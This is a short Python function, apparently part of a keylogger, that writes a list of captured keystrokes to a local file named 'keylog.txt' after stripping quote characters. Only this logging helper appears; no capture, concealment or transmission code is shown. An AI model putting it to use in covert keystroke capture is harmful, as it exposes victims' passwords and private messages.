def write_to_file(keys_pressed):
	with open("keylog.txt", "a") as keylog:
		for key in keys_pressed:
			key_string = str(key)
			if (key_string == "\"'\""):
				parsed_key = key_string.strip('\"')
			else:
				parsed_key = key_string.strip('\'')
			keylog.write(parsed_key)
	keylog.close()